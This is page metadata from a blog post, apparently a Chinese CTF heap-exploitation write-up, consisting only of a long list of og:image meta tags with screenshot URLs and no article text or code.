<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7ZCUWQ3KAVGKAB7.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_D3DCDBFN6BFS7AY.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KN4WJWSJJ4HC9VE.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FRYZ59TQMSFW6TK.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_QRUXTS646FKXEAS.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_VFQNFY7QR4V8CRG-1695379768564-24.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_B9PMX7Y6BUNXX68-1695379746623-20.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NTGAR62F4NUUEPD-1695379792691-27.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_PH5MQPBFFHH6UWF-1695379744185-16.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_KMUDJ58864BVGRJ-1695379733565-12.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_7R56GD8898CAHVC-1695379732363-10.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_C845XWYM8RY6FP2-1695379729718-6.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_FSXFTBKCRMVYT59-1695379728616-4.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/958172_NWAPT4CW7S4UWB8-1695379724638-1.webp">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194123520.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194223371.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010194317515.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010195052740.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200619889.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200749723.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010200845852.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201137929.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201734234.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010201942670.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010202458509.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231010204701287.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201716247.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201759897.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012201828914.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211308891.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211034680.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231012211530114.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085422164.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013085545532.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013162104393.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013171006999.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013163308872.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013170335971.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172604185.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013172858520.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173848951.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013173951000.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013174809638.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175009240.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175140816.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175714934.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013175937769.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204026160.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204454716.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013204656108.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205315619.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013205510025.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210049926.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210254989.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013210849688.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211147427.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211909572.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013211951560.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212024266.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212227267.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212506159.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231013212722616.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014110953593.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111020031.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111503915.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111605033.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111828047.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111851907.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014111909499.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027200937204.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201346420.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027201322231.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027202331065.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205809961.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210017826.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027205922973.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210544449.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027210759803.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211024351.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211133139.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231027211207749.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193723730.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193755564.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193900312.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014193928870.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194618108.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194639500.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014194826822.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195140863.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195254059.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231014195309680.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110448627.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110515624.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110726890.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110930692.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015110909769.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111410250.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111505547.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111750815.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015111900959.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121919702.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015121949906.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015125946150.png">
<meta property="og:image" content="https://jelasin.github.io/2023/09/22/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3Pwn_heap%E5%8F%8A%E8%B5%9B%E9%A2%98%E8%AF%A6%E7%BB%86%E8%A7%A3%E6%9E%90/image-20231015130236228.png">
